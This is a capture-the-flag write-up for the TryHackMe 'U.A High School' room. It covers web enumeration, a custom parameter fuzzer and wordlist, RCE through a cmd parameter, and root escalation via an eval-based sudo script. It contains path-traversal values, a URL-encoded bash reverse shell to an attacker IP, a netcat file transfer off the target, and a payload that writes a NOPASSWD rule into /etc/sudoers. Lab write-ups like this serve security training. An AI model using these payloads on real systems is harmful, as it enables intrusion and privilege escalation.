# Try Hack Me - U.A High School
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 60
# Vulnerabilities: RCE through a vulnerable parameter, PrivEsc via command injection in a script run as sudo

# Reconnaissance:

nmap scan:
```bash
nmap -sC -sV <target_ip>
```
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:37:0b:63:1a:25:51:c0:e2:12:92:d6:d9:87:3a:6e (RSA)
|   256 74:a1:9f:46:7e:5c:4c:a5:a6:8c:8c:bd:2b:c9:85:47 (ECDSA)
|_  256 53:6f:5a:2f:dc:8d:90:0c:65:d8:47:4a:04:7d:06:db (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

we enumerate further by fuzzing the directories by using gobuster:
```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

we find a /assets directory but we cannot see anything at /assets. lets fuzz this directory once again.

```bash
gobuster dir -u http://<target_ip>/assets -w /usr/share/wordlists/dirb/common.txt
```
we find /images and /index.php directories. we enumerate them one by one.

reached a dead end after enumerating the /images directory. but i noticed something unusual after visting the /index.php directory. we landed on a blank page but when i opened the developer tools and went to the storage tab, i found out that we were assigned a phpsession cookie. this means a php process was going on in the background. there could be a hidden parameter according to the hint provided. i skimmed through various writeups on this exact ctf but i found that the authors somehow already knew that the parameter was going to be the cmd parameter as they used the command
```bash
ffuf -u "http://<target_ip>/assets/index.php?FUZZ=whoami" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```
i wont recommend doing this since you have no idea about the parameter carrying out RCE beforehand. this seems bad practice. A beginner hacker should stick to generalized commands and payloads which will target major parameters and their respective values instead we will create a custom fuzzer and a word list which will put parameter pairs in the FUZZ placeholder!

copy this wordlist and place it in a param_value_pairs.txt file

```bash
file=../../../../etc/passwd
file=/etc/passwd
file=../../../windows/win.ini
page=home
page=admin
page=login
id=1
id=admin
id=1337
url=http://evil.com
url=https://google.com
path=../
path=../../../
dir=/etc
folder=uploads
include=config.php
require=db.php
view=source
load=module
cmd=id
command=whoami
execute=ls
func=phpinfo
function=system
debug=1
test=1
mode=debug
action=view
action=delete
action=edit
user=admin
admin=true
username=admin
password=test
token=1234
session=abc
lang=en
language=english
theme=dark
template=default
```

now use this script to fuzz the endpoints using the above most common parameters txt file.

```bash

while IFS= read -r pair; do
    param=$(echo "$pair" | cut -d'=' -f1)
    value=$(echo "$pair" | cut -d'=' -f2)
    echo -n "Testing $param=$value ... "
    SIZE=$(curl -s "http://<target_ip>/assets/index.php?$param=$value" | wc -c)
    echo "Size: $SIZE"
    if [ "$SIZE" -gt 0 ] && [ "$SIZE" -ne "$(curl -s "http://<target_ip>/assets/index.php" | wc -c)" ]; then
        echo "  [POSSIBLE HIT!] Different response size!"
        echo "  URL: http://<target_ip>/assets/index.php?$param=$value"
    fi
done < param_value_pairs.txt
```
```bash
#now give the script the appropriate permissions
chmod +x parafuzzer.sh

#now run the script
./parafuzzer.sh
```

so let me break this down for you. the script will put all the parameter-value pairs in the fuzz placeholder of the script which is the $param and the $value. so instead of carelessly assuming that the parameter is going to be the cmd parameter which will carry out RCE for us magically, we do a more professional enumeration and we find a match

the script output will lookl like this:

Testing view=source ... Size: 0

Testing load=module ... Size: 0

Testing cmd=id ... Size: 72

  [POSSIBLE HIT!] Different response size!

  URL: http://<target_ip>/assets/index.php?cmd=id

so the main logic behind this script is that we are supposed to display any para-value pair that gives us a response anything other than 0. so when we fuzz a wrong para-value pair, we will get 0 as the response length. whereas when we get a reponse greater than 0, it means we have found a hit!
# Privilege Escalation (A):
using the ?cmd parameter we use curl to send a reverseshell.(note: the url for the reverseshell must be urlencoded)
# Shell as www-data
 ```bash
#first setup a netcat listener in one terminal
nc -lnvp 4444
```

```bash
curl -s "http://<target_ip>/assets/index.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<attacker_ip>%2F4444%200%3E%261%22"
```
we have a shell as www-data and now we can install linpeas on the system at /tmp directory.
using linpeas we find out that there is a /Hidden_Content which has a scret txt file

```bash
cat /var/www/Hidden_Content/passphrase.txt | base64 -d 
```
use the base64 -d in a pipeline to decode the passphrase from base64
passphrase: AllmightForEver!!!

now we know that a passphrase is required in two things: ssh private key and for steganography in a jpg image. since we know that the .ssh directory is forbidden, we transfer the images on the system from /var/www/html/assets/images to our attacker machine in order to find the hidden data. 
we find out that the names of the jpg images are oneforall.jpg and yuei.jpg. we already have performed steg on the yuei.jpg since we couldn't find any leads in the initial stage of enumeration so out best shot is at oneforall.jpg
```bash
#on your attacker machine:
nc -lnvp 4445 > oneforall.jpg
```
```bash
#on your target machine:
nc <attacker_ip> 4445 < /var/www/html/assets/images/oneforall.jpg
```
you could reduce the command on the target machine by simply traversing to the path where the oneforall.jpg image is

on doing some enumeration on the image we find out that the image is corrupted. maybe the headers are wrong. 

steghide extract -sf oneforall.jpg

Enter passphrase: 

steghide: the file format of the file "oneforall.jpg" is not supported.

lets edit the headers using hexedit.
```bash
hexedit oneforall.jpg
```
we can see that the header is wrong for a jpg file. edit the first line of bytes to the magic numbers :

FF D8 FF E0 00 10 4A 46 49 46 00 01
 once you have edited the header. you will see a .JFIF in the extreme top right. this means you have successfully edited the corrupted image from changing the .PNG header to a .JFIF header.
now we can easily run steghide on it and find the hidden data

```bash
steghide extract -sf oneforall.jpg 
```
enter the passphrase and you will get a creds.txt with deku's credentials in it

the contents of creds.txt are:
  
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:<REDACTED>

now we have a shell as deku!

lets get a root shell now. 

# Privilege Escalation (B):

firstly lets find out whether deku can run sudo on the system or not

```bash
sudo -l
```
we get to know that deku can run the script /opt/NewComponent/feedback.sh as sudo. on viewing the script we find out that the script blocks some special characters like / or ( and stuff

#!/bin/bash

echo "Hello, Welcome to the Report Form       "

echo "This is a way to report various problems"

echo "    Developed by                        "

echo "        The Technical Department of U.A."


echo "Enter your feedback:"

read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then

echo "It is This:"

eval "echo $feedback"

echo "$feedback" >> /var/log/feedback.txt

 echo "Feedback successfully saved."

else

echo "Invalid input. Please provide a valid input." 

fi
 we can enter any feedback to this script because of the line eval "echo $feedback" 
 the reason why eval "echo feedback" is horribly vulnerable is because if you enter some commands that are not sanitized by the script, then you can run those commands as root!
 
 eval "echo test"

#Executes: echo test

#Output: test

in this manner we can execute commands as sudo instead of entering valid feedback!

but since some special characters are blocked we have to use a payload which doesn't involve any of these special characters.
we will directly add deku to the /etc/sudoers file and get sudo access without enterring any password. after doing some google dorking i found this out

when prompted for a feedback, enter this payload:
```bash
deku ALL= ALL NOPASSWD: ALL >> /etc/sudoers
```
we successfully add deku to the /etc/sudoers file.

```bash
sudo su
```
we have a shell as root and we successfully read and submit the root.txt flag
                                 
